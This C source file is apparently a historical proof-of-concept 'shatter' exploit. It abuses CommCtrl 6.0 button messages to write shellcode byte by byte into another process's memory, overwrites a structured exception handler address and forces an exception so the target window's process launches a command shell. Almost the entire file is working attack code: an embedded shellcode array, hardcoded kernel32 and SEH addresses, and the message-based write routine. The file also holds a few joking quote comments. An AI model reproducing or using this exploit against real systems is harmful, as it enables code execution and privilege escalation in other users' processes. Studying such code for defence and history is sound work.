/**********************************************************
* CommCtrl 6.0 Button Shatter attack
*
* Demonstrates the use of windows messages to;
*    - inject shellcode to known location
*    - overwrite 4 bytes of a critical memory address
*
* 4 Variables need to be set for proper execution.
*    - tWindow is the title of the programs main window
*    - SEH_HANDLER_ADDR is the critical address to overwrite
*    - SHELLCODE_ADDR is the data space to inject the code
*    - KERN32_BASE_ADDR is the base address of kernel32 on your system
*
* Oliver Lavery <olavery at pivx.com>
*
* Based on (and pretty much identical to) shatterseh2.c by 
* Brett Moore [ brett moore security-assessment com ]
**********************************************************/
#include <windows.h>
#define _WIN32_WINNT 0x501
#include <commctrl.h>
#include <stdio.h>

// Local Cmd Shellcode. 
// Added a loadLibrary call to make sure msvcrt.dll is present -- ol
BYTE exploit[] = "\x90\x68\x74\x76\x73\x6D\x68\x63\x72\x00\x00\x54\xB9\x61\xD9\xE7\x77\xFF\xD1\x68\x63\x6D\x64\x00\x54\xB9\x44\x80\xC2\x77\xFF\xD1\xCC";

char g_classNameBuf[ 256 ];

char tWindow[]="Calculator";// The name of the main window
#define SEH_HANDLER_ADDR 0x77ed73B4      // Critical Address To Overwrite

// you might want to find a less destructive spot to stick the code, but this works for me --ol
#define SHELLCODE_ADDR 0x77ed7484   // Known Writeable Space Or Global Space

// The range between these will be scanned to find our shellcode bytes.
#define KERN32_BASE_ADDR (BYTE *)0x77e61000 // Start of kernel32
#define KERN32_TOP_ADDR (BYTE *)0x77ed0000 // Not the actual top. Just where we stop looking for bytes.

void doWrite(HWND hWnd, BYTE tByte, BYTE* address);
void IterateWindows(long hWnd);
void *FindByteInKernel32( BYTE byte );


void ErrorTrace(const char *msg, DWORD error)
{
	DWORD numWritten;

	WriteFile( GetStdHandle(STD_OUTPUT_HANDLE), msg, strlen(msg), &numWritten, NULL);
	if (error) {
		LPTSTR lpMsgBuf;

		FormatMessage( 
			FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
			NULL,
			error,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
			(LPTSTR) &lpMsgBuf,
			0,
			NULL 
		);
		WriteFile( GetStdHandle(STD_OUTPUT_HANDLE), lpMsgBuf, strlen(lpMsgBuf), &numWritten, NULL);
		// Free the buffer.
		LocalFree( lpMsgBuf );
	}
}


//"Should there be a reason to believe that code that comes from a variety
//of people, unknown from around the world, should be somehow of higher quality
//than that from people who get paid to do it professionally?"
// - Steve Ballmer

// (Hey, wait, are MS employees generally household names? 
//  Isn't MS an equal opportunity employer?)

int main(int argc, char *argv[])
{
   long hWnd;
   HMODULE hMod;
   DWORD ProcAddr;
   printf("%% Playing with CommCtrl 6.0 messages\n");
   printf("%% Oliver Lavery.\n\n");
   printf("%% based on Shatter SEH code by\n");
   printf("%% brett moore security-assessment com\n\n");

   // Find local procedure address
   hMod = LoadLibrary("kernel32.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "LoadLibraryA");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[13] = ProcAddr;

   hMod = LoadLibrary("msvcrt.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "system");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[26] = ProcAddr;

   printf("+ Finding %s Window...\n",tWindow);
   hWnd = (long)FindWindow(NULL,tWindow);
   if(hWnd == NULL)
   {
      printf("+ Couldn't Find %s Window\n",tWindow);
      return 0;
   }
   printf("+ Found Main Window At...0x%xh\n",hWnd);
   IterateWindows(hWnd);
   printf("+ Not Done...\n");
   return 0;
}

void *FindByteInKernel32( BYTE byte )
{
	BYTE *addr = KERN32_BASE_ADDR;
	while ( addr < KERN32_TOP_ADDR ) {
		if ( *addr == byte ) return addr;
	addr++;
	}
	ErrorTrace( "Couldn't find a shellcode byte in kernel32. Sorry.", 0 );
	exit(0);
}

//"Should there be any reason to believe that a relatively small group of 
//paid programmers working under the direction of a marketing machine can produce
//code approaching the quality of a global team linked by the internet, whose
//every line of code is subject to ruthless peer review, and whose only standard
//is excellence?"
// - crunchie812

void doWrite(HWND hWnd, BYTE tByte, BYTE *address)
{
   void *byte_addr;
   byte_addr = FindByteInKernel32( tByte );
   SendMessage( hWnd,(UINT) BCM_SETTEXTMARGIN,0,(LPARAM)byte_addr);
   if ( !SendMessage( hWnd, (UINT)BCM_GETTEXTMARGIN, 0, (LPARAM)address) ) {
	   ErrorTrace( "error", GetLastError() );
   }
}

void IterateWindows(long hWnd)
{
   long childhWnd,looper;
   childhWnd = (long)GetNextWindow((HWND)hWnd,GW_CHILD);
   GetClassName( (HWND)childhWnd, g_classNameBuf, sizeof(g_classNameBuf) );
   while ( strcmp(g_classNameBuf, "Button") )
   {
//      IterateWindows(childhWnd);
      childhWnd = (long)GetNextWindow((HWND)childhWnd ,GW_HWNDNEXT);
	  GetClassName( (HWND)childhWnd, g_classNameBuf, sizeof(g_classNameBuf) );
   }

   if(childhWnd != NULL)
   {
      printf("+ Found button control..0x%xh\n",childhWnd);

      // Inject shellcode to known address
	  printf("+ Sending shellcode to...0x%xh\n", SHELLCODE_ADDR);
      for (looper=0;looper<sizeof(exploit);looper++)
         doWrite((HWND)childhWnd, exploit[looper],(BYTE *)(SHELLCODE_ADDR + looper));

      // Overwrite SEH
      printf("+ Overwriting Top SEH....0x%xh\n", SEH_HANDLER_ADDR);
      doWrite((HWND)childhWnd, ((SHELLCODE_ADDR) & 0xff), (BYTE  *)SEH_HANDLER_ADDR);
      doWrite((HWND)childhWnd, ((SHELLCODE_ADDR >> 8) & 0xff), (BYTE  *)SEH_HANDLER_ADDR+1);
      doWrite((HWND)childhWnd, ((SHELLCODE_ADDR >> 16) & 0xff), (BYTE  *)SEH_HANDLER_ADDR+2);
      doWrite((HWND)childhWnd, ((SHELLCODE_ADDR >> 24) & 0xff), (BYTE  *)SEH_HANDLER_ADDR+3);

      // Cause exception
      printf("+ Forcing Unhandled Exception\n");
      doWrite((HWND)childhWnd, 1, (BYTE *)0xDEADBEEF);
      printf("+ Done...\n");
      exit(0);
   }
}

